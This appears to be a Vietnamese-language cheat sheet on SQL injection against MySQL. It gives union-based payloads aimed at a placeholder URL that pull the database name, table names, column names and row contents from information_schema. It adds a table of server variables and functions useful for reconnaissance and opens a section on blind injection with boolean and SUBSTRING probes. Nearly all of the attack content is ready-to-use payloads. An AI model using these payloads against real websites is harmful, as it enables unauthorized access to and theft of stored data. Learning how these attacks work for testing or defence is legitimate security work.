## check database khi biết cột lỗi;
- thay cột lỗi bằng database
`http://fakesite.com/report.php?id=-23 union select 1,2,database(),4,5-- -`

|Variable.Function|ahihi|Output|
|----------|-------------|--------------|
|@@hostname	|:|	Tên máy chủ hiện tại|
|@@tmpdir|	:	|Tept Directory|
|@@datadir|	:	|Thư mục Dữ liệu|
|@@version|	:	|Phiên bản của DB|
|@@basedir|	:	|Thư mục cơ sở|
|user()|	:	|Người dùng hiện tại|
|database()|	:	|Cơ sở dữ liệu hiện tại|
|version()|	:	|	Phiên bản|
|schema()|	:	|	Cơ sở dữ liệu hiện tại|
|UUID()|	:	|	Khóa UUID của Hệ thống|
|current_user()|	:	|Current User|
|current_user|	:	|Current User|
|system_user()|	:	|Current Sustem user|
|session_user()|	:	|Session user|
|@@GLOBAL.have_symlink|	:	|Check if Symlink Enabled or Disabled|
|@@GLOBAL.have_ssl|	:	|Check if it have ssl or not|



- lấy ra tên bảng 
```
http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema="tên database"-- -

hoặc
,unhex(hex(group_concat(table_name))),2 from information_schema.tables where table_schema=database()-- -
```

-lấy ra tên cột:
```
http://fakesite.com/report.php?id=-23 union Select 1,2,column_name,4,5 from information_schema.columns where table_schema='tên database" and table_name='tablenamehere'-- -
```
hoặc thay đoạn lấy table =column

- trích dữ liệu:

```
http://fakesite.com/report.php?id=-23 union Select 1,2,concat(column1,column2),4,5 from tên bảng-- -
```

## Blind SQL Injection

- check : and 1=1 -> and 1=0 

- kiểm tra version :.. and subtring(@@version,1,1)=4 ( trong đó 4 là check version 4.0 /)

```
1. SUBSTRING(string,vị trí, số lượng): Hàm cắt chuỗi
vd:
SUBSTRING('dbo', 1, 1) = ‘d’
SUBSTRING('dbo', 2, 1) = ‘b’
SUBSTRING('dbo', 3, 1) = ‘o’
```
